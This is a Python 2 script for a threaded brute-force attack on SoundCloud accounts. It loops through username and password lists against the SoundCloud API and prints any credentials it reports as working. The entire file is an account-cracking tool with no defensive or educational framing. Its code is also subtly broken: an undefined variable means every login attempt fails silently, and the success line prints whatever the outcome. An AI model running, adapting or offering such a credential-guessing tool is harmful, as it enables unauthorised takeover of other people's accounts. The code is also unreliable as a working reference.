#!/usr/bin/python
 
import threading
import Queue
import socket
import soundcloud
 
usernameList = open('users.txt','r').read().splitlines()
passwordList = open('passwords.txt','r').read().splitlines()


def TryPass(user_name,password):


    client = soundcloud.Client(client_id='xxxxxxxxxxxxxxxxx',
                           client_secret='xxxxxxxxxxxxxxxxx',
                           username = user_name,
                           password = pwd)




    if client.get('/me').id > 1:
                return True
    return

 
class WorkerThread(threading.Thread) :
 
    def __init__(self, queue, tid) :
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid
 
    def run(self) :
        while True :
            user_name = None 
 
            try :
                user_name = self.queue.get(timeout=1)
 
            except  Queue.Empty :
                return
 
            try :
                for pwd in passwordList:
                        result = TryPass(user_name,pwd)
                        print'FUNGERAR', user_name, pwd, '-----------------------------------------------'
                                    
                                        
            except :
                print'x',user_name, pwd,
 
            self.queue.task_done()


 
queue = Queue.Queue()
 
threads = []
for i in range(1, 2) : # Number of threads
    worker = WorkerThread(queue, i) 
    worker.setDaemon(True)
    worker.start()
    threads.append(worker)
 
for user_name in usernameList :
    queue.put(user_name)     # Push user_names onto queue
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
    item.join()


 
print "Testing Complete!"
